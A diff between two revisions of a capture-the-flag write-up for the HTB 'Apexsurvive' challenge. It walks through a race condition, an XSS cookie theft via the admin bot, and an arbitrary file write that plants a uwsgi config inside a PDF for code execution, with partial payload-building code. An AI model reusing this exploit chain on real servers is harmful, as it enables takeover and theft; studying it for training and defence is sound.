 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">queueRequests</span>(target, wordlists):
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    engine <span style="color:#f92672">=</span> RequestEngine(endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://192.168.1.253:1337&#39;</span>,
@@ -1188,28 +1191,30 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-apexsurvive-multi.png"></p>
 <p>Out of 10 race condition attempts, we had 3 successful hits where a token intended for <code>attacker@apexsurvive.htb</code> made it to our inbox. The race condition is exploitable after all!</p>
 <p>Now, these verification tokens are not usable because they got superseded by failed attempts, this means we must stop on success to preserve elevated tokens.</p>
-<p>This is doable manually since hit chance is pretty high and I don&rsquo;t think it would be hard to automate it either.</p>
-<p>Anyways, we won the race, let&rsquo;s keep going.</p>
+<p>This is doable manually since hit chance is pretty high, but I don&rsquo;t think it would be hard to automate it either.</p>
+<p>Anyways, we are now certain that we can win the race. We did it.</p>
 <h2 id="chapter-6-the-attack-chain">Chapter 6: The Attack Chain<a href="#chapter-6-the-attack-chain" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>With the race condition completed, let&rsquo;s look at our new attack chain:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-admin.png"></p>
 <p>We should be able to reach admin easily now.</p>
-<p>Starting with a normal user, we run our RC payload manually, one-by-one until we get a hit:
+<p>Starting with a normal user, we run our race condition payload manually, one-by-one until we get a hit:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-apexsurvive-single.png"></p>
 <p>We then verify our email to unlock the <strong>Internal Settings</strong>
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/internal-settings.png"></p>
 <p>We then enter a poisoned product into the system:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-product-add.png"></p>
-<p>&hellip; and submit it to the admin bot:
+<p>&hellip; and submit it for review by the admin bot:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-product-reported.png"></p>
-<p>A few seconds pass, and we receive the exfiltrated admin cookie:
+<p>A few seconds pass, then we receive the exfiltrated admin cookie:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/webhook-admin-cookie.png"></p>
 <p>We hijack the admin session and unlock <strong>Admin Settings</strong>
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/admin-contract.png">
-Also notice our admin username: <code>Xclow3n</code>.</p>
-<p>The next goal is RCE, but how?
+Also notice our new, admin username: <code>Xclow3n</code>.</p>
+<p>We are now admin. The next goal is RCE, but how?
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-admin.png"></p>
-<p>Let&rsquo;s check the <code>/addContract</code> logic:</p>
+<p>With our newly-acquired privileges, let&rsquo;s reevaluate our new building blocks. Remember our methodology pep-talk earlier?</p>
+<p>We have one new endpoint exclusively available to admin users: <code>/addContract</code></p>
+<p>Let&rsquo;s give it some scrutiny:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/addContract&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isVerified</span>
@@ -1249,8 +1254,8 @@ Also notice our admin username: <code>Xclow3n</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(current_app<span style="color:#f92672">.</span>root_path, <span style="color:#e6db74">&#39;contracts&#39;</span>, uploadedFile<span style="color:#f92672">.</span>filename)
 </span></span></code></pre></div><p><code>uploadedFile.filename</code> is directly fed to <code>os.path.join</code> sans validation giving us an <strong>Arbitrary File Write.</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/root/directory1/app/&#39;</span>, <span style="color:#e6db74">&#39;contracts&#39;</span>, <span style="color:#e6db74">&#39;/file.txt&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/file.txt&#39;</span>
-</span></span></code></pre></div><p>Before our AFW code, the uploaded file gets saved to <code>/tmp/temporaryUpload</code> and a function, <code>checkPDF()</code>, is called. Let&rsquo;s see what <code>checkPDF()</code> does:</p>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/file.txt&#39;</span>                      <span style="color:#75715e"># we control this --^</span>
+</span></span></code></pre></div><p>There is catch though: before our AFW vulnerable code gets hit, the uploaded file gets saved to <code>/tmp/temporaryUpload</code> and a function, <code>checkPDF()</code>, is called. Let&rsquo;s see what <code>checkPDF()</code> does:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">checkPDF</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/temporaryUpload&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
@@ -1259,21 +1264,21 @@ Also notice our admin username: <code>Xclow3n</code>.</p>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
-</span></span></code></pre></div><p>It&rsquo;s a simple function that checks if our uploaded file is a correct, parseable PDF document using <code>PdfReader</code> from <code>PyPDF2</code> in strict mode.</p>
+</span></span></code></pre></div><p>It&rsquo;s a simple function that checks if our uploaded file is a correct, parseable PDF document by feeding it to <code>PdfReader</code> from <code>PyPDF2</code> in strict mode.</p>
 <p>I did some digging around but the function seems secure. There seems to be no way around uploading a valid PDF.</p>
-<p>This restricts us to an <strong>Arbitrary PDF Write</strong> if we may say.</p>
+<p>This turn of events restricts us to an <strong>Arbitrary PDF Write</strong> if we may say.</p>
 <p>After some googling, searching for <code>uwsgi file write pdf rce</code> yielded this <a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">interesting piece</a></p>
 <p>The article uses two &ldquo;features&rdquo; of <code>uwsgi</code> to turn arbitrary file write into code execution.</p>
 <ol>
-<li><code>uwsgi</code> is very flexible when reading its own config files. It scans the configuration file for <code>[uwsgi]</code> and reads configuration from there.</li>
-<li><code>uwsgi</code> config syntax allows for magic <code>@</code> operators, these provides convenient file reading, command execution and other powerful stuff.</li>
+<li><code>uwsgi</code> is very flexible when reading its own config files. It scans the configuration file for <code>[uwsgi]</code> and reads configuration from there even if its a binary.</li>
+<li><code>uwsgi</code>&rsquo;s config syntax allows for magic <code>@</code> operators, these provide convenience utilities such as file reading and, you guessed it, command execution.</li>
 </ol>
-<p>Thanks <code>uwsgi</code>.</p>
-<p>The article suggest embedding the weaponized <code>uwsgi</code> command within a JPEG metadata, packaging that in a PDF, then using that PDF as a payload.</p>
-<p>They kindly provide a proof-of-concept as well. Let&rsquo;s get to work</p>
-<p>We set up our listeners:
+<p>We love you, <code>uwsgi</code>.</p>
+<p>The same article suggests embedding the weaponized <code>uwsgi</code> configuration within a JPEG as metadata, packaging that in a PDF, then the final PDF would be your payload.</p>
+<p>They kindly provided a proof-of-concept as well. Let&rsquo;s get to work</p>
+<p>We set up our listeners, I usually use <code>ngrok</code> to obtain a publicly accessible TCP endpoint:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/listener-setup.png"></p>
-<p>Let&rsquo;s weaponize an innocent <code>flower.jpg</code>, notice how the payload pads the JPEG metadata with newlines:</p>
+<p>Let&rsquo;s weaponize an innocent <code>flower.jpg</code>, notice how the payload pads the JPEG metadata with newlines (these are the <code>&amp;#x0a;</code> sequences on either side):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> fpdf <span style="color:#f92672">import</span> FPDF
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> exiftool <span style="color:#f92672">import</span> ExifToolHelper
 </span></span><span style="display:flex;"><span>
@@ -1292,16 +1297,15 @@ Also notice our admin username: <code>Xclow3n</code>.</p>
 </span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>add_page()
 </span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>image(<span style="color:#e6db74">&#39;./flower.jpg&#39;</span>)
 </span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>output(<span style="color:#e6db74">&#39;payload.pdf&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>)
-</span></span></code></pre></div><p>Payload generation screenshot for extra immersion:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/gen-pdf.png"></p>
-<p>This is our payload, can&rsquo;t be malicious, right?
+</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/gen-pdf.png"></p>
+<p>Finally, this is our payload, can&rsquo;t be malicious, right?
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/pdf-payload.png"></p>
-<p>We upload the request through Repeater, setting the filename to <code>/app/uwsgi.ini</code> to overwrite <code>uwsgi</code>&rsquo;s config file:
+<p>We upload the request through Repeater, setting the filename to <code>/app/uwsgi.ini</code> to overwrite <code>uwsgi</code>&rsquo;s current config file:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/repeater-pdf-rce.png"></p>
-<p>Notice how the image metadata (with our <code>uwsgi</code> command) are stored as plaintext within the otherwise encoded PDF.</p>
+<p>Notice how the image metadata (with our <code>uwsgi</code> command) are stored as plaintext within the otherwise encoded PDF; that&rsquo;s because we embedded them inside a JPEG which mainly serves to protect our payload from PDF&rsquo;s compression and encoding features as far as I understand.</p>
 <p>To trigger the command, we must reload <code>uwsgi</code> by modifying a python source file within the application, this is a debug feature enabled in the currently loaded <code>uwsgi.ini</code> through:</p>
 <pre tabindex="0"><code>py-autoreload = 3
-</code></pre><p>Let&rsquo;s just overwrite any file say <code>/app/application/database.py</code>, sending our request and&hellip;
+</code></pre><p>For that, we will just overwrite any file say <code>/app/application/database.py</code>. We send our request and&hellip;
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/flag.png"></p>
 <p><code>HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}</code>
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-complete.png"></p>
@@ -1311,13 +1315,13 @@ Also notice our admin username: <code>Xclow3n</code>.</p>
 <p>Another major part of why I found this challenge extremely interesting is the fact that I have never exploited a race condition before. I genuinely did not know that&rsquo;s a <em>thing</em> you could do.</p>
 <p>It was a mental game more than anything else, me versus a piece of logic.</p>
 <p>At some point, and through a game of elimination, I reached a strong conviction that the only route has to be through <code>isInternal</code>.</p>
-<p>Again, and through a long-winded game of elimination, I reached a conviction that the only way to get <code>isInternal</code> is a race condition. I got fixated on the race condition, then I pulled it off.</p>
-<p>Visual proof of a late-night conviction 😅:
+<p>Next, and through another long-winded game of elimination, I reached a conviction that the only way to get <code>isInternal</code> is through a race condition. I got fixated on the race condition, then I pulled it off.</p>
+<p>Visual proof of my somewhat late-night conviction as I explained the situation to my team 😅:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/discord.png"></p>
 <p>On a second note, there was so much tangential research that I have not included in this writeup, but that does not mean it was useless. The most rewarding aspect of CTFs are these little, educational journeys you take doing seemingly irrelevant, tangential research.</p>
 <p>CTF after CTF and challenge after challenge, you realize you have accumulated a good variety of information, about seemingly random things, and evidently, that variety is what creates a resourceful, solid cybersecurity engineer.</p>
-<p>Also big thanks to my team <strong>PwnSec</strong> for the support, it was beautiful to see the team effort as we collaborated on different categories.</p>
-<p>That&rsquo;s all I got for today, see you in the next one.</p>
+<p>Big thanks to my team <strong>PwnSec</strong> for their support, it was beautiful to see the team effort as we collaborated on different categories.</p>
+<p>That&rsquo;s all I got for today, if you made it this far, you deserve a handshake 🤝. See you in the next one 🤍</p>
 
       </div></div>
 
